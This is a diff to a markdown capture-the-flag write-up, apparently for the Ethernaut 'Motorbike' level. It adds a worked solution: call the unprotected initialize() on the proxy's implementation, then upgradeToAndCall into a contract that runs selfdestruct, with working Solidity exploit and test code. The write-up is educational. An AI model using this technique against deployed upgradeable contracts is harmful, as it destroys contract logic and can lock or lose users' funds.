@@ -1709,18 +1709,90 @@ target.setMaxBalance(uint160(address(this)));
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/1a60b061d5bb809c3d7e4ee915c77a00b1eca95d/contracts/proxy/Proxy.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/1a60b061d5bb809c3d7e4ee915c77a00b1eca95d/contracts/utils/Address.sol
 
-## 25 Motor Bike
+## 25 Motor
 
 To beat this level, we need to comply with
 
 ```solidity
-
+!Address.isContract(engines[_instance])
 ```
+
+As `engines[address(motorbike)] = address(engine)`, the level wants us to _destroy_ the engine.
 
 ### Solution
 
-???
+#### Initializers
+
+A solution would be then, to upgrade the engine of the motorbike, and call its `selfdestruct` function.
+
+We can upgrade the contact with `_upgradeToAndCall()`, which is guarded by `_authorizeUpgrade()`, that controls that
+
+```solidity
+require(msg.sender == upgrader, "Can't upgrade")
+```
+
+How do we become upgraders?
+
+Notice that `Engine` inherits from `Initializable`, which uses a `initialize()` function as a sort of _constructor_. The implementation of `initialize()` here is,
+
+```solidity
+function initialize() external initializer {
+    horsePower = 1000;
+    upgrader = msg.sender;
+}
+```
+
+The implementers missed a critical part here, which is commented in the [documentation of the initializers](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers):
+
+> However, while Solidity ensures that a constructor is called only once in the lifetime of a contract, a regular function can be called many times. To prevent a contract from being initialized multiple times, you need to add a check to ensure the initialize function is called only once:
+
+In other words, we can just call `initialize()` and become the `upgrader`.
+
+#### Finding out the address of the engine
+
+So where is the engine contract? Look at both the `Motorbike` and `Engine` contracts which go by [EIP 1967](https://eips.ethereum.org/EIPS/eip-1967#logic-contract-address):
+
+```solidity
+// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+```
+
+#### Putting all together
+
+We need the evil engine
+
+```solidity
+contract SelfDestructableEngine {
+  function attack() external {
+    selfdestruct(payable(msg.sender));
+  }
+}
+```
+
+and we upgrade and call it at the `setUp()` stage
+
+```solidity
+// create your evil engine
+SelfDestructableEngine evilEngine = new SelfDestructableEngine();
+
+// initialize to become the owner
+// upgrade to the evil engine, call the selfdestruct() attack
+engine.initialize();
+engine.upgradeToAndCall(address(evilEngine), abi.encodeWithSignature("attack()"));
+```
+
+Verifying
+
+```solidity
+function testExploit() public {
+  // setUp() and testExploit() happen at different transactions,
+  // we need to run our exploit at setUp() to be able to verify.
+  utils.submitLevelInstance(challengeAddress);
+}
+```
 
 ### References
 
-* ???
+* https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers
+* https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/d446a47a4f9c9bacefd0f9ac7d7fc8cfa0888ed5/packages/core/contracts/Initializable.sol#L42
+ https://eips.ethereum.org/EIPS/eip-1967
